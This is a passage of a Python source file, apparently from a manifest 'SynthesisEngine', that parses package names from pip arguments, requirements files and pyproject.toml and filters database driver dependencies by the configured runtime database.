            if lowered.startswith("-r") and lowered not in {"-r"}:
                packages.update(self._packages_from_requirements_path(token[2:], requirements_by_path))
                idx += 1
                continue
            if lowered.startswith("--requirement="):
                packages.update(
                    self._packages_from_requirements_path(token.split("=", 1)[1], requirements_by_path)
                )
                idx += 1
                continue
            if lowered in {"-e", "--editable"}:
                idx += 2  # skip editable target
                continue
            if lowered.startswith("-"):
                idx += 1
                continue
            canonical = self._normalize_dependency_token(token)
            if canonical and canonical != ".":
                packages.add(canonical)
            idx += 1
        return packages

    def _packages_from_requirements_path(
        self, path: str, requirements_by_path: Dict[str, set[str]]
    ) -> set[str]:
        normalized = self._normalize_requirements_path(path)
        return (
            requirements_by_path.get(path)
            or requirements_by_path.get(normalized)
            or requirements_by_path.get(f"./{normalized}")
            or set()
        )

    def _extract_pyproject_dependencies(self, data: Dict[str, Any]) -> set[str]:
        packages: set[str] = set()
        project = data.get("project")
        if isinstance(project, dict):
            for dep in project.get("dependencies", []) or []:
                if isinstance(dep, str):
                    canonical = self._normalize_dependency_token(dep)
                    if canonical:
                        packages.add(canonical)
            optional = project.get("optional-dependencies", {})
            if isinstance(optional, dict):
                for deps in optional.values():
                    for dep in deps or []:
                        if isinstance(dep, str):
                            canonical = self._normalize_dependency_token(dep)
                            if canonical:
                                packages.add(canonical)
        tool = data.get("tool")
        if isinstance(tool, dict):
            poetry = tool.get("poetry")
            if isinstance(poetry, dict):
                deps = poetry.get("dependencies", {})
                if isinstance(deps, dict):
                    for name, constraint in deps.items():
                        if name.lower() == "python":
                            continue
                        canonical = self._normalize_dependency_token(name)
                        if canonical:
                            packages.add(canonical)
                extras = poetry.get("extras", {})
                if isinstance(extras, dict):
                    for deps in extras.values():
                        for dep in deps or []:
                            canonical = self._normalize_dependency_token(dep)
                            if canonical:
                                packages.add(canonical)
        return packages

    def _parse_requirements_content(self, content: str) -> set[str]:
        packages: set[str] = set()
        for raw_line in content.splitlines():
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            token = line.split("#", 1)[0].strip()
            canonical = self._normalize_dependency_token(token)
            if canonical:
                packages.add(canonical)
        return packages

    def _normalize_dependency_token(self, token: str) -> str:
        if not isinstance(token, str):
            return ""
        cleaned = token.strip().strip("'\"")
        if not cleaned or cleaned.startswith("-"):
            return ""
        cleaned = cleaned.split(";", 1)[0].strip()
        cleaned = cleaned.split(" @", 1)[0].strip()
        cleaned = cleaned.split("@", 1)[0].strip()
        if "[" in cleaned:
            cleaned = cleaned.split("[", 1)[0].strip()
        cleaned = self._strip_version(cleaned)
        cleaned = cleaned.replace("_", "-")
        cleaned = cleaned.strip()
        return self._canonicalize_package_name(cleaned)

    def _canonicalize_package_name(self, name: str) -> str:
        normalized = (name or "").strip().lower()
        if not normalized or normalized == ".":
            return ""
        normalized = normalized.replace("_", "-")
        alias_map = getattr(self, "_module_alias_map", PYTHON_MODULE_PACKAGE_MAP)
        return alias_map.get(normalized, normalized)

    def _read_text_content(self, entry: Dict[str, Any]) -> str:
        content = entry.get("content")
        if not isinstance(content, str):
            return ""
        encoding = (entry.get("encoding") or "plain").lower()
        if encoding == "base64":
            try:
                decoded = base64.b64decode(content.encode("utf-8"))
                return decoded.decode("utf-8", errors="ignore")
            except Exception as exc:  # pragma: no cover - guardrail logging
                LOGGER.warning("Base64 decode failed for %s: %s", entry.get("path", "<unknown>"), exc)
                return ""
        return content

    def _path_in_allowlist(self, path: str, patterns: Sequence[str]) -> bool:
        return any(fnmatch.fnmatch(path, pattern) for pattern in patterns)

    def _normalize_requirements_path(self, path: str) -> str:
        normalized = (path or "").strip().lstrip("./")
        return normalized.replace("\\", "/")

    def _is_python_path(self, path: str) -> bool:
        return path.lower().endswith(".py")

    def _find_file_entry(self, manifest: Dict[str, Any], filename: str) -> Dict[str, Any] | None:
        target = filename.strip()
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            if (entry.get("path") or "").strip() == target:
                return entry
        return None

    @staticmethod
    def _strip_version(token: str) -> str:
        separators = ["==", ">=", "<=", "~=", ">", "<"]
        for sep in separators:
            if sep in token:
                return token.split(sep, 1)[0].strip()
        return token.strip()


    def _runtime_db(self) -> str:
        runtime = self._requirement.get("runtime") or {}
        if isinstance(runtime, dict):
            for key in ("db", "database"):
                value = runtime.get(key)
                if value:
                    return str(value).strip().lower()
        value = self._requirement.get("db") or self._requirement.get("database")
        if value:
            return str(value).strip().lower()
        return ""

    def _allow_external_db(self) -> bool:
        runtime = self._requirement.get("runtime") or {}
        if isinstance(runtime, dict) and "allow_external_db" in runtime:
            return bool(runtime["allow_external_db"])
        if "allow_external_db" in self._requirement:
            return bool(self._requirement["allow_external_db"])
        return False

    def _should_include_user_dep(self, dep: str) -> bool:
        dep_norm = self._canonicalize_package_name(self._strip_version(dep))
        if not dep_norm:
            return False
        runtime_db = self._runtime_db()
        if dep_norm in MYSQL_DRIVERS:
            if runtime_db in {"mysql", "mariadb"}:
                return True
            if not runtime_db:
                return self._allow_external_db()
            LOGGER.info(
                "Skipping MySQL driver dependency '%s' during synthesis for runtime db=%s",
                dep,
                runtime_db or "unknown",
            )
            return False
        if dep_norm in POSTGRES_DRIVERS:
            if runtime_db in {"postgres", "postgresql"}:
                return True
            if not runtime_db:
                return self._allow_external_db()
            LOGGER.info(
                "Skipping PostgreSQL driver dependency '%s' during synthesis for runtime db=%s",
                dep,
                runtime_db or "unknown",
            )
            return False
        return True

    def _inject_user_deps(self, manifest: Dict[str, Any]) -> Dict[str, Any]:
        if not self._user_deps:
            return manifest
        deps = [dep for dep in (manifest.get("deps") or []) if isinstance(dep, str) and dep.strip()]
        lower_seen = {dep.lower() for dep in deps}
        for dep in self._user_deps:
            if not self._should_include_user_dep(dep):
                continue
            key = dep.lower()
            if key in lower_seen:
                continue
            deps.append(dep)
            lower_seen.add(key)
        manifest["deps"] = deps
        return manifest


__all__ = ["SynthesisEngine", "SynthesisLimits", "ManifestValidationError"]
